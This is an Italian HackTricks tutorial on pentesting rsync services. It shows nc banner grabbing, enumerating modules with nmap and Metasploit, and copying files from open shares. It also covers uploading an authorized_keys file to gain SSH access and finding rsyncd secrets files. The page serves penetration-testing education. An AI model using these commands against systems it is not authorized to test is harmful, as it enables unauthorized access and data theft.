# 873 - Pentesting Rsync

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Informazioni di base**

Da [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** √® un'utilit√† per il [trasferimento](https://en.wikipedia.org/wiki/File\_transfer) e la [sincronizzazione](https://en.wikipedia.org/wiki/File\_synchronization) efficiente di [file](https://en.wikipedia.org/wiki/Computer\_file) tra un computer e un hard disk esterno e tra [computer](https://en.wikipedia.org/wiki/Computer) in rete, confrontando i tempi di [modifica](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) e le dimensioni dei file.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) √à comunemente presente nei [sistemi operativi](https://en.wikipedia.org/wiki/Operating\_system) di tipo [Unix-like](https://en.wikipedia.org/wiki/Unix-like). L'algoritmo rsync √® un tipo di [delta encoding](https://en.wikipedia.org/wiki/Delta\_encoding) e viene utilizzato per ridurre l'utilizzo della rete. [Zlib](https://en.wikipedia.org/wiki/Zlib) pu√≤ essere utilizzato per la [compressione dei dati](https://en.wikipedia.org/wiki/Data\_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) e [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) o [stunnel](https://en.wikipedia.org/wiki/Stunnel) possono essere utilizzati per la sicurezza.

**Porta predefinita:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Enumerazione

### Banner e comunicazione manuale
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Enumerazione delle cartelle condivise**

I **moduli Rsync** sono riconosciuti come **condivisioni di directory** che potrebbero essere **protette da password**. Per identificare i moduli disponibili e verificare se richiedono password, vengono utilizzati i seguenti comandi:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Fai attenzione che alcune condivisioni potrebbero non apparire nell'elenco, nascondendole eventualmente. Inoltre, l'accesso a alcune condivisioni potrebbe essere limitato a specifiche **credenziali**, come indicato da un messaggio di **"Accesso negato"**.

### [**Forza bruta**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Utilizzo manuale di Rsync

Dopo aver ottenuto un **elenco dei moduli**, le azioni dipendono dal fatto che sia necessaria l'autenticazione. Senza autenticazione, √® possibile **elencare** e **copiare** i file da una cartella condivisa a una directory locale tramite:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Questo processo **trasferisce in modo ricorsivo i file**, preservando i loro attributi e permessi.

Con **le credenziali**, √® possibile elencare e scaricare da una cartella condivisa nel seguente modo, dove verr√† visualizzata una richiesta di password:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Per **caricare contenuti**, come ad esempio un file _**authorized_keys**_ per l'accesso, utilizzare:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Per individuare il file di configurazione di rsyncd, eseguire:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
All'interno di questo file, un parametro _secrets file_ potrebbe puntare a un file contenente **nomi utente e password** per l'autenticazione rsyncd.


## Riferimenti
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
